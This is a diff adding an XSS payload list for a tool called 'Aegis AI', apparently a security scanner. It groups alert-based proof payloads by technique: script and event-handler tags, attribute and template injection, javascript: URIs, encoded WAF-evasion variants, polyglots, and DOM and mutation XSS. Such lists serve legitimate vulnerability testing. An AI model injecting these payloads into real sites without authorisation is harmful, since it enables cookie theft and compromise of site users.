@@ -1,0 +1,80 @@
+# ──────────────────────────────────────────────────────────────────
+# Aegis AI — Cross-Site Scripting (XSS) Payloads
+# Lines starting with # are comments. Blank lines are ignored.
+# ──────────────────────────────────────────────────────────────────
+
+# ── Classic reflected / stored ───────────────────────────────────
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+# ── Attribute injection ─────────────────────────────────────────
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# ── JavaScript URI ───────────────────────────────────────────────
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+
+# ── Event handler variants ───────────────────────────────────────
+<img src=1 onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+
+# ── Template literal injection ───────────────────────────────────
+${alert(1)}
+${7*7}
+{{constructor.constructor('alert(1)')()}}
+
+# ── SVG-based ────────────────────────────────────────────────────
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+
+# ── WAF evasion variants ────────────────────────────────────────
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<script >alert(1)</script >
+<script%20>alert(1)</script%20>
+%3Cscript%3Ealert(1)%3C/script%3E
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<img src=x onerror=alert`1`>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+
+# ── Polyglot payloads ───────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+";alert(1);//
+'-alert(1)-'
+\'-alert(1)//
+
+# ── DOM-based ────────────────────────────────────────────────────
+#<script>alert(1)</script>
+?default=<script>alert(1)</script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+# ── Mutation XSS ─────────────────────────────────────────────────
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
